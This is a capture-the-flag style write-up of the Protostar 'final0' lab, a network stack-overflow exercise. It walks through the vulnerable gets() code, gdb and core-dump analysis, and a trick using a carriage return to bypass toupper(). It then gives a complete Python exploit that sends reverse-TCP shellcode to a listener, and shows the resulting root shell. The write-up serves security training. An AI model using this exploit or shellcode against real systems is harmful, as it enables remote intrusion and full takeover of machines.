#### Protostar Final0 

##### About
This level combines a stack overflow and network programming for a remote overflow.

###### Hints:
* depending on where you are returning to, you may wish to use a toupper() proof shellcode.  
  
Core files will be in /tmp.
  
This level is at /opt/protostar/bin/final0  

##### Source code
```c
#include "../common/common.c"

#define NAME "final0"
#define UID 0
#define GID 0
#define PORT 2995

/*
 * Read the username in from the network
 */

char *get_username()
{
  char buffer[512];
  char *q;
  int i;

  memset(buffer, 0, sizeof(buffer));
  gets(buffer);

  /* Strip off trailing new line characters */
  q = strchr(buffer, '\n');
  if(q) *q = 0;
  q = strchr(buffer, '\r');
  if(q) *q = 0;

  /* Convert to lower case */
  for(i = 0; i < strlen(buffer); i++) {
      buffer[i] = toupper(buffer[i]);
  }

  /* Duplicate the string and return it */
  return strdup(buffer);
}

int main(int argc, char **argv, char **envp)
{
  int fd;
  char *username;

  /* Run the process as a daemon */
  background_process(NAME, UID, GID); 
  
  /* Wait for socket activity and return */
  fd = serve_forever(PORT);

  /* Set the client socket to STDIN, STDOUT, and STDERR */
  set_io(fd);

  username = get_username();
  
  printf("No such user %s\n", username);
}
```

As shown in get_username(), '\n' and '\r' in our payload will be replaced by NULL, and then our payload will be turn into uppercase.  
  
But notice that, after character replacement, strlen(buffer) and strdup(buffer) will treat our payload ends with the NULL which used to replace.  
  
It means that we can use '\r' to bypass toupper().

##### Solution
```
root@protostar:/opt/protostar/bin# gdb final0
......
(gdb) disas get_username
Dump of assembler code for function get_username:
0x0804975a <+0>:    push   %ebp
0x0804975b <+1>:    mov    %esp,%ebp
0x0804975d <+3>:    push   %ebx
0x0804975e <+4>:    sub    $0x224,%esp
0x08049764 <+10>:   movl   $0x200,0x8(%esp)
0x0804976c <+18>:   movl   $0x0,0x4(%esp)
0x08049774 <+26>:   lea    -0x210(%ebp),%eax      ; <-- return address should be in buffer + 0x210 + 4
0x0804977a <+32>:   mov    %eax,(%esp)
0x0804977d <+35>:   call   0x8048eac <memset@plt>
0x08049782 <+40>:   lea    -0x210(%ebp),%eax
......
(gdb) quit
```

At first, I would like to use JMP ESP to construct a stable payload, but msfelfscan can't find JMP ESP in final0. Never mind, let's jump to the stack directly.

```
root@protostar:/tmp# ulimit -c unlimited
root@protostar:/tmp# echo 1 > /proc/sys/fs/suid_dumpable

root@protostar:/tmp# cat test.py
#!/usr/bin/python

from socket import *

s = socket()
s.connect(("127.0.0.1", 2995))
s.send("A"*532 + "B"*4)
s.close()

root@protostar:/tmp# ./test.py
root@protostar:/tmp# ls
core.11.final0.1544   test.py

root@protostar:/tmp# gdb -q -c core.11.final0.1544
Core was generated by '/opt/protostar/bin/final0'.
Program terminated with signal 11, Segmentation fault.
#0  0x42424242 in ?? ()
(gdb) x/20x $esp-0x228
0xbffffa38:     0x00000200      0x00000515      0xb7e9c894      0x0d696910
0xbffffa48:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffa58:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffa68:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffa78:     0x41414141      0x41414141      0x41414141      0x41414141
......
(gdb) quit
```

Now we get the address to return, and then I choose a shell reverse TCP shellcode to complete my payload. 

```python
import socket

#http://www.shell-storm.org/shellcode/files/shellcode-883.php
shellcode = "\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89" \
"\xe1\xcd\x80\x92\xb0\x66\x68\xc0\xa8\x38\x66\x66\x68\x05\x39\x43" \
"\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59" \
"\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68" \
"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

s = socket.socket()
s.connect(("192.168.56.101",2995))

payload = "oops\r" + "\x90"*100 + shellcode + "\x90"*(532 - len(shellcode) - 100 - 5) + "\x80\xfa\xff\xbf" + "\n"

s.send(payload)
print s.recv(1024)
s.close()
```

And I listen to port 1337 in my Kali.

```
root@Kali: ~# nc -l -p 1337
whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
```

##### Reference
<https://thesprawl.org/research/exploit-exercises-protostar-final/#final0>  
<https://www.mattandreko.com/2012/01/22/exploit-exercises-final-0/>
